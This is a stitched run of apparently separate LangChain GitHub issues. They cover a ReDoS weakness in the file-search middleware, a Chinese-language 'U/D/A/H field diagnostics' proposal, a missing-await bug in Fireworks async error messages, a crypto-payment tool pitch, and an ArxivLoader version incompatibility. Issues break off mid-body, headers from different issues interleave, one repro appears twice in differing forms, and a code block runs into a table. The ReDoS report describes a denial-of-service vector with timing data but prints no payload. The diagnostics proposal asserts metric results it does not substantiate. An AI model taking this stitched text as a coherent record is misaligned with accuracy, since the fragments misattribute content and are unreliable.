`FilesystemFileSearchMiddleware._python_search` (`libs/langchain_v1/langchain/agents/middleware/file_search.py`) compiles a caller-supplied `pattern` with `re.compile` and runs it against every line of every matched file, with no bound on matching time. Since Python's `re` backtracks, a short, ordinary-looking pattern causes catastrophic (exponential) backtracking on a short adversarial line:

```
n=20 chars: search took 0.0972s
n=22 chars: search took 0.3815s
n=24 chars: search took 1.3396s
n=26 chars: search took 5.6272s
```

A single ~50-60 character line matching this shape (or any of the many equivalent nested-quantifier/alternation forms) would hang the search for a duration that grows exponentially with line length, using a pattern well under 100 characters and a file that looks unremarkable. If a caller (an LLM-driven agent, or anything else that can influence the search pattern or file contents) can trigger this path, it's a real ReDoS/DoS vector, not just a theoretical one.

I noticed this while looking at #38737, an automated PR from a security-scanning bot that attempts to mitigate this via `_MAX_REGEX_PATTERN_LENGTH = 1000` and `_MAX_REGEX_LINE_LENGTH = 10000` caps. I verified those caps don't actually close the gap: the pattern above is 6 characters and the adversarial lines above are all under 30 characters, so both stay far inside those limits while still reproducing catastrophic backtracking. ReDoS comes from pattern *structure*, not pattern or input *length*, so a length-based cap doesn't address the underlying issue.

Worth noting `_ripgrep_search`, a few lines above `_python_search` in the same file, already establishes the right principle for this class of problem: it wraps the ripgrep subprocess call with `timeout=30` and falls back to the Python path on `subprocess.TimeoutExpired`. The Python fallback should bound execution *time* the same way rather than diverging with a length-based mitigation. Python's built-in `re` has no native timeout, so the usual options are the third-party `regex` module (which accepts a `timeout=` kwarg on `search`/`match`) or running the search with a hard deadline in a worker and falling back the same way the ripgrep branch does on expiry.

### System Info

```
langchain (libs/langchain_v1, main branch)
Python 3.10
```

title: [提案] U/D/A/H 场域诊断框架 — 基于 LangChain Docs Q&A 数据集的验证
author: luoxuejian000
body:
### Submission checklist

- [x] This is a feature request, not a bug report or usage question.

- [ ] Other / not sure / general

### Feature Description

### 功能描述

我提议将 U/D/A/H 场域诊断框架作为 LangChain 开发者的一个补充诊断层。

U/D/A/H 是一个四维文本轨迹分析框架，用于衡量任意文本语料的“场域健康度”：

- **U（统一性 Unity）** — 词汇与叙事一致性
- **D（发展性 Development）** — 信息密度与结构复杂度
- **A（对抗性 Adversariality）** — 矛盾标记与张力信号
- **H（和谐度 Harmony）** — 综合健康度（由 U、D、A 推导）

该框架无需微调或外部 LLM 调用，仅基于语言结构特征（词汇多样性、句子长度分布、标点密度）进行诊断，输出：

1. 完整的 U/D/A/H 轨迹（CSV 格式）
2. 结构化诊断报告（JSON 格式）
3. 可视化 HTML 报告（含四维轨迹图）

我已在 **LangChain Docs Q&A 数据集**（32 对问答，12099 字符）上完成了验证，结果完全可复现，详见附件。

所请求的具体功能：一个轻量级 Python 模块，可嵌入任何 LangChain 工作流（文档解析、Agent 轨迹日志、问答评估），以生成场域健康诊断。该模块将补充现有 LangSmith 评估指标（faithfulness、context retention），提供目前缺失的**跨文档/跨轮次健康度信号**。

### Use Case

### 使用场景

LangChain 开发者目前拥有优秀的单轮评估工具（LangSmith 指标、追踪、延迟/成本监控），但无法回答以下问题：

- “我的 Agent 已经运行了 50 轮——它的推理轨迹仍然连贯吗？”
- “我有 50 份文档——它们在语言上一致吗，还是存在隐藏的矛盾？”
- “我在一个讨论串中回答了 30 个社区问题——我的回答质量是否随时间漂移？”

U/D/A/H 场域诊断正好填补这一空白。它提供跨文档/跨轮次的“健康度信号”，能够在任务级指标显现问题之前，提醒开发者关注结构退化。

例如，在 LangChain Docs Q&A 数据集上的验证中，诊断报告揭示：

- **A（对抗性）驱动了 83.3% 的场域动态**——意味着问答对在结构上是“对抗性”的（每个答案都在回应/解决一个问题，这符合预期）
- 标记了 **6 个“沉默失谐”候选区域**——语言结构保持稳定但和谐度（H）下降，可能存在语义-结构错位

这类洞察无法从任何现有 LangChain 评估工具中获得。

### Proposed Solution

### 建议解决方案

我建议新增一个轻量级 Python 模块，例如 `langchain-field-diagnostics`，提供简洁的 API：

```python
from langchain_field_diagnostics import FieldDiagnostics

# 输入：任意文本——文档、问答对、Agent 轨迹日志
diagnostics = FieldDiagnostics(text=your_text)

# 步骤 1：计算 U/D/A/H 轨迹（step_size 控制粒度）
trajectory = diagnostics.compute_trajectory(step_size=200)

# 步骤 2：生成完整诊断报告
report = diagnostics.diagnose()

# 输出：
# - CSV 轨迹
# - JSON 结构化报告
# - HTML 可视化报告
## 验证结果（LangChain Docs Q&A，32 对问答，12099 字符）

| 指标 | 数值 |
|------|------|
| 采样点数 | 36 |
| U 值范围 | 0.483 – 0.508 |
| D 值范围 | 0.488 – 0.505 |
| A 值范围 | 0.053 – 0.267 |
| H 值范围 | 0.442 – 0.527 |
| 主导驱动维度 | A（83.3%）|
| U 驱动占比 | 8.3% |
| 均衡占比 | 8.3% |
| 沉默失谐候选区域 | 6 处 |
| 概念漂移检测 | “用户”和“助手”角色（平均漂移度：0.305 / 0.310）|

### Alternatives Considered



```markdown
### 替代方案

在提出此集成之前，我考虑了以下替代方案：

1. **LangSmith 评估指标**（faithfulness、context retention）—— 这些指标擅长单轮质量评估，但无法提供跨轮次或跨文档的轨迹分析。它们无法回答“Agent 在 50 轮后是否正在退化”这类问题，因为每一轮都是独立评估的。

2. **通用可观测性工具**（Datadog、Jaeger）—— 这些工具提供追踪可视化，但不提供“场域健康度”诊断维度。它们能显示“发生了什么”，但无法判断系统是否正在结构漂移。

3. **人工检查**—— 对生产环境中的 Agent 或大型文档集不可扩展。

U/D/A/H 方法专门针对跨文档/跨轮次的场域健康分析设计。它不取代现有工具，而是增加一个当前 LangChain 生态中缺失的结构健康层。

在 LangChain Docs Q&A 数据集上的验证表明，该方案可行且能产出可操作的信号。

### Additional Context

### 补充上下文

我是 DeepSeek-V3 社区 #1466 跨框架验证项目的牵头人。在该项目中，U/D/A/H 与四个独立框架（TAT-7、Cophy、HeartFlow、Agora/mnemo substrate）完成了交叉验证，结果如下：

- 0.3 阈值在三个独立框架中收敛
- TAT-7 与 Cophy 在 31 步轨迹上的相关系数 r = 0.985
- 五个翻转点在四个框架中完全重合（位置偏差为 0）

本次针对 LangChain 的验证是该工作的延伸。

**验证产物：**

- CSV 轨迹（36 个采样点）
- JSON 结构化诊断报告
- HTML 可视化报告（U/D/A/H 四维轨迹图）

所有产物均可在验证仓库中获取：
https://github.com/luoxuejian000/thinkcheck-agent-v10

DeepSeek-V3 #1466 跨框架验证报告：
https://github.com/deepseek-ai/DeepSeek-V3/issues/1466

**声明：** 这是一份提案，而非 PR。我现阶段不请求合并——我只是分享一个已在 LangChain 数据上完成验证的诊断工具。如果社区表示感兴趣，我愿意为一个独立的 `langchain-field-diagnostics` 集成发起 PR。

**判断权在观察者手中。**

### Related Issues / PRs

_No response_

### Reproduction Steps / Example Code (Python)

```python
# Offline, deterministic repro (mock aiohttp session returning a 4xx).
  import asyncio
  from unittest.mock import patch

  from langchain_fireworks import Fireworks


  class _Resp:
      status = 400
      async def __aenter__(self): return self
      async def __aexit__(self, *a): return False
      

  class _Session:
      async def __aenter__(self): return self
      async def __aexit__(self, *a): return False
      def post(self, *a, **k): return _Resp()
      

  async def main():
      llm = Fireworks(model="foo", api_key="dummy")
      with patch("langchain_fireworks.llms.ClientSession",
  return_value=_Session()):
          await llm._acall("hi")


  asyncio.run(main())
  
  # Real-world trigger: any `await Fireworks(...).ainvoke("...")` /
  `.agenerate(...)`
  # where Fireworks rejects the request (bad model, invalid params, rate limit,
  5xx).
```

### Error Message and Stack Trace (if applicable)

```shell
ValueError: Fireworks received an invalid payload: <bound method
  ClientResponse.text of <ClientResponse ... [400 Bad Request]>>
```

### Description

* When the Fireworks API returns an error (4xx/5xx), I expect the raised error
  to include the API response body explaining what went wrong.
  * Instead, the message contains a coroutine repr like `<bound method
  ClientResponse.text ...>`.
  
  Root cause: `Fireworks._acall` (in `langchain_fireworks/llms.py`) builds its
  HTTP error messages with `{response.text}`. On an `aiohttp.ClientResponse`,
  `.text` is a coroutine method, not a property — unlike a `requests.Response`,
  where `.text` is a property — so it is never awaited and the f-string
  interpolates the bound method's repr instead of the body. The synchronous
  `_call` path (which uses `requests`) is correct. The async method already
  correctly uses aiohttp's `.status` (vs requests' `.status_code`), so this is
  an oversight, not intent.

  Proposed fix: `await response.text()` in both error branches of `_acall`. I
  have the fix plus a regression unit test ready (the test fails on current
  master, showing the bound-method message, and passes with the fix; the
  libs/partners/fireworks unit suite and ruff are green). Happy to open the PR —
  could a maintainer assign this to me?

  > Python Version: 3.12

  -------------------

  > langchain_fireworks: current master

title: Fireworks LLM: async _acall error messages show a bound-method repr instead of the API response body (missing await)
author: m-hamza9752
body:
### Package (Required)

- [x] langchain-fireworks (the `Fireworks` completions LLM)

### Description

`Fireworks._acall` (the async path in `langchain_fireworks/llms.py`) builds its HTTP error messages with `{response.text}`. On an `aiohttp.ClientResponse`, `.text` is a **coroutine method**, not a property — unlike a `requests.Response`, where `.text` *is* a property. Because it is never awaited, the f-string interpolates the bound method's `repr()` instead of the response body.

So whenever the Fireworks API returns a 4xx/5xx during an **async** call (`ainvoke` / `agenerate`), the raised error hides the real reason and shows `<bound method ClientResponse.text ...>`. The **sync** path (`_call`, which uses `requests`) is correct. Notably the async method already correctly translated `requests`' `.status_code` to aiohttp's `.status`, but missed the analogous `.text` property-vs-coroutine difference — so this looks like an oversight rather than intent.

### Reproduction Steps / Example Code (Python)

The mismatch is deterministic and reproducible offline by mocking the aiohttp session to return a 4xx:

```python
import asyncio
from unittest.mock import patch

from langchain_fireworks import Fireworks


class _Resp:
    status = 400

    async def __aenter__(self):
        return self

    async def __aexit__(self, *a):
        return False

    async def text(self):
        return "model does not exist"


class _Session:
    async def __aenter__(self):
        return self

    async def __aexit__(self, *a):
        return False

    def post(self, *a, **k):
        return _Resp()


async def main():
    llm = Fireworks(model="foo", api_key="dummy")
    with patch("langchain_fireworks.llms.ClientSession", return_value=_Session()):
        await llm._acall("hi")


asyncio.run(main())
```

Real-world trigger: any `await Fireworks(...).ainvoke("...")` / `agenerate(...)` where Fireworks rejects the request (bad model name, invalid params, rate limit, server error).

### Error Message and Stack Trace (if applicable)

```shell
ValueError: Fireworks received an invalid payload: <bound method _Resp.text of <__main__._Resp object at 0x...>>
```

Expected: the message should contain the actual API error body (here, `model does not exist`).

### Root cause / proposed fix

In `_acall`, the two error branches must `await` the body:

```python
if response.status >= 400:
    error_text = await response.text()
    msg = f"Fireworks received an invalid payload: {error_text}"
    raise ValueError(msg)
if response.status != 200:
    error_text = await response.text()
    msg = (
        f"Fireworks returned an unexpected response with status "
        f"{response.status}: {error_text}"
    )
    raise Exception(msg)
```

I have this fix plus a unit test ready (the test fails on current `master` — showing the `<bound method ...>` message — and passes with the fix; `libs/partners/fireworks` unit tests and `ruff` are green). Could a maintainer assign this to me so I can open the PR? I'll hold off until then per the contributor guidelines.

### System Info

`langchain-fireworks` on current `master`; `aiohttp` 3.x; Python 3.12. The sync `_call` path is unaffected.

- [x] langchain-xai
- [x] Other / not sure / general

### Feature Description

### Why LangChain users need this

   The HTTP 402 "Payment Required" status has existed since 1991 but was never usable — until now. x402 (Coinbase +
   Cloudflare, 119M transactions) and AP2 (Google + 60+ orgs) enable machine payments. LangChain agents need to pay for
    APIs, data, and compute. Currently there is no standard payment tool.

   ---

   ### What it does

   from langchain_paypack import PayPackTool

   tool = PayPackTool(private_key="0x...", network="base-sepolia")
   tool._run(to="0x...", amount=0.001, currency="USDC")

   - x402 + AP2 auto-detection
   - ETH & USDC on Base/Ethereum/Polygon/Arbitrum
   - ERC-4337 batch settlement (save gas)
   - AWS KMS signing (production security)
   - RPC failover + retry + persistent limits

   ---

   ### Package info

   - **PyPI**: https://pypi.org/project/langchain-paypack/
   - **GitHub**: https://github.com/rhcjw/paypack
   - **Demo notebook**: https://github.com/rhcjw/paypack/blob/main/examples/agent_pays_api.ipynb
   - **CI**: GitHub Actions (Python 3.10/3.11/3.12)
   - **License**: Apache 2.0
   - **Maintainer**: rhcjw — actively maintained, accepting PRs

### Use Case

Use Case（使用场景） → 复制这段：

   AI agents building on LangChain need to pay for external resources — paid APIs, data feeds, compute services.
   Currently, when a server returns HTTP 402 "Payment Required", the agent has no way to complete the payment.
   Developers must build custom payment logic from scratch.

   PayPack solves this: `agent.auto_handle_402(response)` handles the entire payment loop. Examples:
   - An agent subscribing to a premium news API ($0.01/article)
   - An agent buying real-time market data for trading decisions
   - An agent paying for GPU compute to run inference

   This feature would give LangChain users a standard, documented payment tool instead of building their own.

### Proposed Solution

PayPack is already published as a standalone PyPI package (`langchain-paypack` v0.5.0) following LangChain community
    integration conventions. The proposed solution is to list it in LangChain's documentation as a recognized community
    integration tool.

   No changes to langchain-ai/langchain core are required. The package follows the community model:
   - Independent PyPI release with `langchain-` prefix
   - Implements LangChain BaseTool interface
   - Separate test suite and CI
   - Maintainer commitment to ongoing support

### Alternatives Considered


   1. Building custom HTTP 402 handler per project — Fragmented, error-prone, no standard approach
   2. Coinbase x402 facilitator — Only supports x402, no AP2 protocol support, no LangChain integration
   3. Nevermined — Full payment infrastructure but heavier, metered billing focus, no LangChain-native tool

   PayPack is lighter: one import, one method call, specifically designed for the LangChain agent use case.

### Additional Context

 - PyPI: https://pypi.org/project/langchain-paypack/
   - GitHub: https://github.com/rhcjw/paypack (CI passing, demo notebook included)
   - Awesome LangChain PR pending: https://github.com/kyrolabs/awesome-langchain/pull/448
   - Supports: x402 (Coinbase), AP2 (Google), ERC-4337 batch settlement
   - Production features: AWS KMS signing, RPC failover, transaction retry, persistent limits

### Related Issues / PRs

### Reproduction Steps / Example Code (Python)

```python
from langchain_community.document_loaders import ArxivLoader

docs = ArxivLoader(
    query="1706.03762",
    load_max_docs=2
).load()
```

### Error Message and Stack Trace (if applicable)

```shell
AttributeError: 'Search' object has no attribute 'results'

Traceback (most recent call last):
  File ".../langchain_community/document_loaders/arxiv.py", line 149, in lazy_load
    yield from self.client.lazy_load(self.query)

  File ".../langchain_community/utilities/arxiv.py", line 211, in lazy_load
    results = self._fetch_results(query)

  File ".../langchain_community/utilities/arxiv.py", line 103, in _fetch_results
    ).results()

AttributeError: 'Search' object has no attribute 'results'
```

### Description

`ArxivLoader` fails when used with `arxiv==4.0.0`.

## Environment

- Python: 3.10
- langchain: 1.3.11
- langchain-community: 0.4.2
- arxiv: 4.0.0
- OS: macOS

## Minimal reproducible example

```python
from langchain_community.document_loaders import ArxivLoader

docs = ArxivLoader(
    query="1706.03762",
    load_max_docs=2
).load()
```

## Actual behavior

The code raises:

```
AttributeError: 'Search' object has no attribute 'results'
```

The traceback points to `langchain_community/utilities/arxiv.py`, where `_fetch_results()` calls:

```python
return self.arxiv_search(...).results()
```

## Investigation

From inspecting the implementation, `ArxivAPIWrapper._fetch_results()` calls `Search.results()`. With `arxiv==4.0.0`, the `Search` object no longer provides a `results()` method, causing the loader to fail.

I also noticed that `langchain-community` does not declare a version constraint for the optional `arxiv` dependency, so users can install an incompatible version without receiving a compatibility warning.

Downgrading to `arxiv==1.4.8` resolves the issue.

## Expected behavior

`ArxivLoader` should either:

- support the current `arxiv` API,
- declare a compatible version range for the optional `arxiv` dependency, or
- raise a clear compatibility error instead of failing with an `AttributeError`.

> orjson: 3.11.9
> packaging: 26.0

> pyyaml: 6.0.3
